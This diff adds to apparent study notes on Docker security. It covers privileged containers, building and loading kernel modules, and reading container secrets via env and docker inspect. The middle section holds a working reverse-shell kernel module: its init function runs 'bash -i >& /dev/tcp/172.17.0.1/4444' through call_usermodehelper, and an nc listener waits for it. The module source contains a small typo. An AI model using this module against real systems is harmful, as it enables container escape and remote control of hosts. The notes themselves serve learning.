@@ -165,14 +165,175 @@ cd /test/root
 
 ```sh
 # Using the privilege flag
-docker run -it --privilege alpine sh
+docker run -it --privileged alpine sh
 
 # Install
 apk add -U libcap
 
 # Get the list of the privilege capabilities
 capsh --print
+# CAP_SYS_MODULE, CAP_SYS_ADMIN, ...
 
 ```
 
 ### Writing to kernel space from a container
+When the docker container is ran with privilege flag, it has the `CAP_SYS_MODULE` for us to load some kernel module (a binary file with `.ko` extension - stands for kernel object, a file compiled with C programming compiler)
+
+`.ko` file is loaded with the command `insmod` or `modprobe`
+
+#### How to compile one `.ko` file? (ChatGPT 🤖)
+In Linux, a `.ko` file is a kernel object file. It contains a compiled kernel module that can be loaded into the kernel using tools like `insmod` or `modprobe`.
+
+To build a kernel module and generate a `.ko` file, you typically need the kernel headers and development tools installed on your system. Here's a general overview of the steps involved in building a kernel module:
+
+1. Install Kernel Headers: Ensure that the appropriate kernel headers are installed on your system. These headers provide the necessary interface and definitions for building kernel modules.
+
+2. Create the Module Source Code: Write the source code for your kernel module. This can be done using a text editor. Kernel modules are typically written in C or a compatible language.
+
+3. Write a Makefile: Create a Makefile that specifies the compilation instructions for building the module. The Makefile should specify the necessary compiler flags and dependencies.
+
+4. Build the Module: Use the `make` command to build the module. The Makefile will compile the source code and generate the corresponding `.ko` file.
+
+5. Load the Module: Once the module is built, you can load it into the kernel using the `insmod` command. Make sure you have appropriate permissions (root or superuser) to load the module.
+
+#### Steps by steps (ChatGPT 🤖)
+To code a kernel module, you'll need a good understanding of C programming, Linux kernel internals, and the specific functionality you want to implement. Here's a high-level overview of the steps involved in coding a basic kernel module:
+
+1. Set up Development Environment:
+   - Install the necessary development tools and kernel headers for your Linux distribution.
+   - Set up a suitable development environment, such as a text editor or an integrated development environment (IDE).
+
+2. Create a New Source File:
+   - Start by creating a new C source file for your kernel module. Give it a `.c` extension (e.g., `module.c`).
+
+3. Include Required Headers:
+   - Include the necessary headers, such as `<linux/module.h>` and `<linux/kernel.h>`, which provide essential definitions and functions for kernel modules.
+
+4. Implement Module Initialization and Cleanup Functions:
+   - Define an initialization function (`module_init`) and a cleanup function (`module_exit`) that will be called when the module is loaded and unloaded, respectively.
+
+5. Implement Desired Functionality:
+   - Write the code for your module, implementing the desired functionality. This can involve interacting with kernel APIs, device drivers, or other kernel components.
+
+6. Build the Module:
+   - Create a Makefile to specify the compilation instructions for your module.
+   - Use the Makefile and the `make` command to compile your module into a `.ko` file.
+
+7. Load and Test the Module:
+   - Use the `insmod` command to load your module into the kernel.
+   - Test your module by invoking its functionality and observing the expected behavior.
+
+8. Unload the Module:
+   - When you're done testing, use the `rmmod` command to unload the module from the kernel.
+
+##### Example for loading and unloading the module: 
+1. `docker_module.c` file
+```c
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+
+static int __init docker_module_init(void) {
+    printk(KERN_INFO "Docker module has been loaded\n") ;
+    return 0;
+}
+
+static void __exit docker_module_exit(void) {
+    printk(KERN_INFO "Docker module has been unloaded\n") ;
+}
+
+module_init(docker_module_init);
+module_exit(docker_module_exit);
+
+```
+
+2. A makefile to compile the module: `Makefile`
+```MAKEFILE
+obj-m += docker_module.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules
+
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
+```
+
+3. Compile it and you will see a .ko file is generated
+```make```
+
+4. Install the mod in the docker container which is ran as --privileged
+```insmod docker_module.ko```
+
+You can check the list of the module installed
+```lsmod```
+
+You can check the log of the kernel too
+```tail -f /var/log/kern.log```
+
+5. Uninstall the mod
+```rmmod docker_module.ko```
+
+### Writing to kernel space to get a reverse shell
+1. `reverseshell_module.c`'s content
+(Commented by ChatGPT 🤖)
+```c
+#include <linux/kmod.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+// This line declares a static character array named command with a size of 50. It represents the command to be executed to establish the reverse shell connection. In this example, it runs a Bash command that redirects the input/output to a specified IP address and port.
+static char command[50] = "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1";
+
+// These lines declare two arrays. argv is an array of strings that represents the arguments to be passed to the call_usermodehelper function. It contains the path to the Bash executable (/bin/bash), the -c flag to specify a command to run, and the command string containing the reverse shell connection command.
+char* argv[] = {"/bin/bash", "-c", command, NULL};
+
+// envp is an array of strings that represents the environment variables to be set when executing the user mode helper. In this case, it sets the HOME variable to /.
+static char* envp[] = {"HOME=/", NULL};
+
+// This function is the module's initialization function, marked with __init. It is called when the module is loaded. The function uses the call_usermodehelper function to execute the specified command in user mode. It passes the argv and envp arrays as arguments and specifies UMH_WAIT_EXEC to wait for the command to complete execution.
+static int __init connect_back_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+// This function is the module's exit function, marked with __exit. It is called when the module is unloaded. In this case, it simply prints a message to the kernel log using the printk function.
+static void __exit connect_back_exit(void){
+    printk(KERN_INFO "Exiting\n");
+}
+
+// These lines register the initialization and exit functions as the module's entry points using the module_init and module_exit macros, respectively.
+module_init(connect_back init);
+module_exit(connect_back_exit);
+
+```
+
+Using the same makefile to compile the code
+Attacker's terminal:
+```sh
+nc -nlvp 4444
+```
+
+Docker container:
+chmod +x reverseshell_module.ko
+insmod reverseshell_module.ko
+
+Doubt: I don't understand why the author hacked its own host by adding some files into it themselves, maybe I am missing something there.
+
+### Accessing secrets
+Secrets are usually kept in places such as environment variables or within the source code.
+Anyone with access to the container, can easily read these secrets.
+A user with privileged access on the host, can also access secrets residing inside the container - docker inspect away.
+
+#### Methods of getting the environemnt variable
+```bash
+# Method 1
+docker run --rm -it database sh
+env
+
+# Method 2
+docker inspect <image-container>
+
+# Method 3
+docker inspect <image-container> -f "{{json .Config.Env}}"
+
+```
